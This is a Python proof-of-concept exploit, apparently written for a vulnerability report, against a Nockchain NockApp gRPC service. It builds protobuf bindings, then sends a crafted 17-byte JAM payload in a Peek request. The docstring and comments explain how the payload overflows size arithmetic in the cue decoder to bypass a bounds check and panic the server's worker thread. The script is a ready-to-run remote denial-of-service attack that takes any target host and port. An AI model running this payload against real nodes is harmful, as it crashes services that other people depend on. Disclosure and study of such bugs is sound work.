#!/usr/bin/env python3
"""
POC: JAM Cue Integer Overflow Panic
====================================

Triggers panic in tokio worker via crafted JAM payload causing
integer overflow in size calculation.

thread 'tokio-runtime-worker' panicked at bitvec-1.0.1/src/slice/api.rs:2681:1:
range 0..18446744073709551615 out of bounds: 0

Path: Poke/Peek -> cue_into -> rub_atom -> bitvec panic

The payload exploits two integer overflows:
1. cursor + sz overflows, bypassing TruncatedBuffer check
2. (sz + 63) >> 6 overflows to 0, allocating 0-word IndirectAtom
3. slice[0..sz] on 0-length slice panics

Usage:
  python3 poc_cue_panic.py <host> [port]
"""

import sys
import os
import subprocess
import tempfile
import shutil

def generate_proto_bindings(proto_dir):
    out_dir = tempfile.mkdtemp(prefix="poc_")
    for proto in ["nockchain/common/v1/primitives.proto", "nockchain/private/v1/nockapp.proto"]:
        subprocess.run([
            sys.executable, "-m", "grpc_tools.protoc",
            f"-I{proto_dir}", f"--python_out={out_dir}", f"--grpc_python_out={out_dir}",
            os.path.join(proto_dir, proto)
        ], capture_output=True)
    for pkg in ["nockchain", "nockchain/common", "nockchain/common/v1",
                "nockchain/private", "nockchain/private/v1"]:
        os.makedirs(os.path.join(out_dir, pkg), exist_ok=True)
        open(os.path.join(out_dir, pkg, "__init__.py"), 'a').close()
    return out_dir


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555

    proto_dir = "crates/nockapp-grpc-proto/proto"
    out_dir = generate_proto_bindings(proto_dir)
    sys.path.insert(0, out_dir)

    try:
        import grpc
        from nockchain.common.v1 import primitives_pb2
        from nockchain.private.v1 import nockapp_pb2, nockapp_pb2_grpc

        # Crafted payload that triggers integer overflow:
        # - Bit 0: 0 (atom tag)
        # - Bits 1-64: 0 (64 zeros, makes idx=64)
        # - Bit 65: 1 (terminator)
        # - Bits 66-128: 1 (63 ones, makes sz = usize::MAX after setting bit 63)
        #
        # This causes:
        # 1. cursor + sz overflows to ~128, bypassing bounds check
        # 2. (sz + 63) >> 6 overflows to 0, allocating 0-word atom
        # 3. slice[0..sz] panics on 0-length slice
        OVERFLOW_PAYLOAD = b'\x00' * 8 + b'\xfe' + b'\xff' * 8  # 17 bytes

        channel = grpc.insecure_channel(f"{host}:{port}")
        stub = nockapp_pb2_grpc.NockAppServiceStub(channel)

        wire = primitives_pb2.Wire(source="poc", version=1)

        print(f"Sending crafted JAM payload to trigger integer overflow...")
        print(f"Payload: {OVERFLOW_PAYLOAD.hex()}")

        try:
            req = nockapp_pb2.PeekRequest(pid=1, path=OVERFLOW_PAYLOAD)
            resp = stub.Peek(req, timeout=5)
            print(f"Response: {resp}")
        except grpc.RpcError as e:
            print(f"gRPC Error: {e.code()} - {e.details()}")

        channel.close()
    finally:
        shutil.rmtree(out_dir, ignore_errors=True)


if __name__ == "__main__":
    main()
